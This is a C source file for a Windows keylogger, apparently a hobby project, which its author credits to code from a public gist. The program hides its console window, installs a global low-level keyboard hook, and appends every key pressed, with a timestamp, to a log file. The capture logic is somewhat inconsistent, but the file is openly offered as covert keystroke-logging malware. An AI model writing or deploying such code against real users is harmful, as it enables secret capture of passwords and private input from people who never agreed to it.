/* Project started March 27th 2024*/
/* Zachary Adelson*/
/* I am creating WINDOWS keylogger in C*/
/* Key logger inspired by https://gist.github.com/patilswapnilv/7338783 hiding window pulled from here as well*/
/* Key press inspired from https://www.geeksforgeeks.org/kbhit-c-language/ */

#include "keylogger.h"

int main()
{
    FILE* logFile = fopen("log.txt", "a+"); // Location to write our log data
    char keyPressed = 'T'; // Location to store the key the user pressed
    myBool keepLooping = True; // A enumerated boolean to keep track of when to exit the while loop

    // Setting up time variable
    time_t curTime;
    curTime = time(NULL);

    //Retrieve the applications instance
    HINSTANCE instance = GetModuleHandle(NULL);
    //Set a global Windows Hook to capture keystrokes using the function declared above
    HHOOK test1 = SetWindowsHookEx( WH_KEYBOARD_LL, LowLevelKeyboardProc, instance,0);

    HWND window;
    AllocConsole();
    window=FindWindowA("ConsoleWindowClass",NULL);
    ShowWindow(window,0);
    
    if(logFile == NULL)
    {
        printf("Error, file not opened.\n");
        return 0;
    }

    fprintf(logFile, "\n\nOpened on %s", ctime(&curTime)); // Print the starting of the Keylogger to the file

    // Loops while our flag is set to True
    while(keepLooping == True)
    {
            curTime = time(NULL);// Update time every cycle
            keyPressed = getch();
            printf("You pressed %c\n", keyPressed);
            switch(keyPressed)
            {
                case 0x20: // space key is pressed
                        fprintf(logFile, "\nUser pressed <Space Bar>\t|\tTime: %s", ctime(&curTime));
                    break;
                case 0x1B: // Escape key is pressed
                        fprintf(logFile, "\nUser pressed <ESC>\t|\tTime: %s", ctime(&curTime));
                    break;
                case 0x09: // Tab key is pressed
                      fprintf(logFile, "\nUser pressed <Tab>\t|\tTime: %s", ctime(&curTime));
                    break;
                case 0x08: // Backspace key is pressed
                      fprintf(logFile, "\nUser pressed <Backspace>\t|\tTime: %s", ctime(&curTime));
                    break;
                default:
                      fprintf(logFile, "\nUser pressed <%c>\t|\tTime: %s", keyPressed, ctime(&curTime));
                    break;
            }

            if((int)keyPressed == ESCAPEKEY)
            {
                keepLooping = False;
            }
    }
    fprintf(logFile, "\nClosed on %s", ctime(&curTime)); // Print the ending of the Keylogger to the file
    fclose(logFile);
    return 0;
}